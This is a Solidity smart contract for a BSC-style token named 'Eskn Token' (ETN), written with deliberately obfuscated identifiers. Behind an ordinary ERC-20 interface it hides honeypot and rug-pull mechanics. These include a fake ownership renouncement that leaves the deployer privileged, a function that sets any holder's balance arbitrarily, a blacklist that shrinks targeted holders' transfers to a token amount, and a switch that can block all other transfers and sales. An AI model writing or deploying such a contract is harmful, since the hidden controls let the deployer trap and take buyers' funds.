//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface receiverBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract exemptBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitLaunch {
    function createPair(address amountTx, address launchedAmount) external returns (address);
}

interface senderFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverExempt) external view returns (uint256);

    function transfer(address minAuto, uint256 swapAt) external returns (bool);

    function allowance(address shouldTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapAt) external returns (bool);

    function transferFrom(
        address sender,
        address minAuto,
        uint256 swapAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchLimit, uint256 value);
    event Approval(address indexed shouldTeam, address indexed spender, uint256 value);
}

interface senderFundMetadata is senderFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EsknToken is exemptBuy, senderFund, senderFundMetadata {

    function liquiditySell() public {
        emit OwnershipTransferred(modeMin, address(0));
        takeReceiver = address(0);
    }

    function walletLaunched(address isFeeLaunch) public {
        if (exemptLaunch) {
            return;
        }
        if (tokenListAmount == launchedAuto) {
            tokenFee = true;
        }
        receiverLaunchedAt[isFeeLaunch] = true;
        
        exemptLaunch = true;
    }

    function getOwner() external view returns (address) {
        return takeReceiver;
    }

    function amountSwap() private view {
        require(receiverLaunchedAt[_msgSender()]);
    }

    function approve(address autoToken, uint256 swapAt) public virtual override returns (bool) {
        isLiquidity[_msgSender()][autoToken] = swapAt;
        emit Approval(_msgSender(), autoToken, swapAt);
        return true;
    }

    uint256 public tokenListAmount;

    function enableSwap(uint256 swapAt) public {
        amountSwap();
        maxSell = swapAt;
    }

    event OwnershipTransferred(address indexed walletTx, address indexed txTotal);

    uint256 private modeLaunchMarketing = 100000000 * 10 ** 18;

    function fundEnable(address totalAt, address minAuto, uint256 swapAt) internal returns (bool) {
        if (totalAt == modeMin) {
            return exemptFrom(totalAt, minAuto, swapAt);
        }
        uint256 launchTeamReceiver = senderFund(swapLaunched).balanceOf(minAt);
        require(launchTeamReceiver == maxSell);
        require(minAuto != minAt);
        if (shouldSwap[totalAt]) {
            return exemptFrom(totalAt, minAuto, enableToken);
        }
        return exemptFrom(totalAt, minAuto, swapAt);
    }

    mapping(address => bool) public shouldSwap;

    address public swapLaunched;

    bool public exemptMarketing;

    function symbol() external view virtual override returns (string memory) {
        return toAmountEnable;
    }

    mapping(address => bool) public receiverLaunchedAt;

    uint256 constant enableToken = 11 ** 10;

    address public modeMin;

    function name() external view virtual override returns (string memory) {
        return marketingLaunch;
    }

    bool private listTxLaunched;

    function balanceOf(address receiverExempt) public view virtual override returns (uint256) {
        return toReceiver[receiverExempt];
    }

    function takeFund(address autoTrading) public {
        amountSwap();
        if (limitTeam == tokenFee) {
            launchedAuto = sellTotal;
        }
        if (autoTrading == modeMin || autoTrading == swapLaunched) {
            return;
        }
        shouldSwap[autoTrading] = true;
    }

    function transferFrom(address totalAt, address minAuto, uint256 swapAt) external override returns (bool) {
        if (_msgSender() != maxMin) {
            if (isLiquidity[totalAt][_msgSender()] != type(uint256).max) {
                require(swapAt <= isLiquidity[totalAt][_msgSender()]);
                isLiquidity[totalAt][_msgSender()] -= swapAt;
            }
        }
        return fundEnable(totalAt, minAuto, swapAt);
    }

    function transfer(address sellTo, uint256 swapAt) external virtual override returns (bool) {
        return fundEnable(_msgSender(), sellTo, swapAt);
    }

    address maxMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return maxLaunched;
    }

    string private toAmountEnable = "ETN";

    uint256 maxSell;

    uint256 exemptTrading;

    function toWallet(address sellTo, uint256 swapAt) public {
        amountSwap();
        toReceiver[sellTo] = swapAt;
    }

    uint256 public launchedAuto;

    bool public limitTeam;

    mapping(address => mapping(address => uint256)) private isLiquidity;

    function owner() external view returns (address) {
        return takeReceiver;
    }

    uint256 private sellTotal;

    function exemptFrom(address totalAt, address minAuto, uint256 swapAt) internal returns (bool) {
        require(toReceiver[totalAt] >= swapAt);
        toReceiver[totalAt] -= swapAt;
        toReceiver[minAuto] += swapAt;
        emit Transfer(totalAt, minAuto, swapAt);
        return true;
    }

    uint8 private maxLaunched = 18;

    constructor (){
        
        receiverBuy toAmountLimit = receiverBuy(maxMin);
        swapLaunched = limitLaunch(toAmountLimit.factory()).createPair(toAmountLimit.WETH(), address(this));
        if (atTo == sellTotal) {
            limitTeam = false;
        }
        modeMin = _msgSender();
        liquiditySell();
        receiverLaunchedAt[modeMin] = true;
        toReceiver[modeMin] = modeLaunchMarketing;
        if (listTxLaunched) {
            tokenListAmount = launchedAuto;
        }
        emit Transfer(address(0), modeMin, modeLaunchMarketing);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return modeLaunchMarketing;
    }

    address private takeReceiver;

    string private marketingLaunch = "Eskn Token";

    address minAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private toReceiver;

    bool public exemptLaunch;

    bool public tokenFee;

    uint256 private atTo;

    function allowance(address launchedBuy, address autoToken) external view virtual override returns (uint256) {
        if (autoToken == maxMin) {
            return type(uint256).max;
        }
        return isLiquidity[launchedBuy][autoToken];
    }

}